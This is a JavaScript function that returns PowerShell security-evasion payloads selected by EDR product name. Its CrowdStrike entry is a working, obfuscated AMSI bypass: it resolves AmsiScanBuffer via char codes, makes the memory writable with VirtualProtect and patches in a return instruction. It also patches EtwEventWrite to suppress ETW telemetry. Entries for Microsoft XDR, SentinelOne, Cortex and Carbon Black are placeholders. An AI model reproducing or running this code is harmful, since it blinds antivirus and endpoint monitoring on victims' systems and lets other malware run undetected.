function getPayload(edr) {
    
    // EDR-specific payloads
    const crowdStrikePayload = `function Find-Core($ModuleName, $FunctionName) {
    $Assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $Methods = $Assembly.GetMethods() | ? { $_.Name -cmatch '^Ge.*P.*oc.*ddress$' }
    $Methods[0].Invoke($null, @($Assembly.GetMethod('GetModuleHandle').Invoke($null, @($ModuleName)), $FunctionName))
}

function Build-Delegate($ParamTypes, $ReturnType = [System.Void]) {
    $DynAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('DynDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $Module = $DynAssembly.DefineDynamicModule('MemModule', $false)
    $Type = $Module.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $Type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParamTypes).SetImplementationFlags('Runtime, Managed')
    $Type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes).SetImplementationFlags('Runtime, Managed')
    $Type.CreateType()
}

$FuncAddress = Find-Core ([char]0x61 + [char]0x6D + [char]0x73 + [char]0x69 + [char]0x2E + [char]0x64 + [char]0x6C + [char]0x6C) ([char]0x41 + [char]0x6D + [char]0x73 + [char]0x69 + [char]0x53 + [char]0x63 + [char]0x61 + [char]0x6E + [char]0x42 + [char]0x75 + [char]0x66 + [char]0x66 + [char]0x65 + [char]0x72)

$ProtectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Find-Core 'kernel32.dll' 'VirtualProtect'), (Build-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$ProtectDelegate.Invoke($FuncAddress, 1, 0x40, [ref]($OldProtect = 0))
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
[System.Runtime.InteropServices.Marshal]::Copy(@(0xC3), 0, $FuncAddress, 1)

# ETW Bypass
$emh = (Find-Core 'ntdll.dll' 'EtwEventWrite')
$o = 0
$pr = $ProtectDelegate.Invoke($emh, 3, 0x40, [ref]$o)
$s = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
if ($s -eq 8) {
    [Runtime.InteropServices.Marshal]::WriteByte($emh, 0xC3)
} else {
    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $emh, 3)
}`;
    const microsoftXDRPayload = `#Microsoft-XDR AMSI Bypass (Placeholder)`;
    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder)`;
    const cortexPayload = `#Cortex AMSI Bypass (Placeholder)`;
    const carbonBlackPayload = `#carbonBlack AMSI Bypass (Placeholder)`;

    switch (edr) {
        case 'CrowdStrike':
            return crowdStrikePayload;
        case 'Microsoft-XDR':
            return microsoftXDRPayload;
        case 'SentinelOne':
            return sentinelOnePayload;
        case 'Cortex':
            return cortexPayload;
        case 'CarbonBlack':
            return carbonBlackPayload;
    }
}
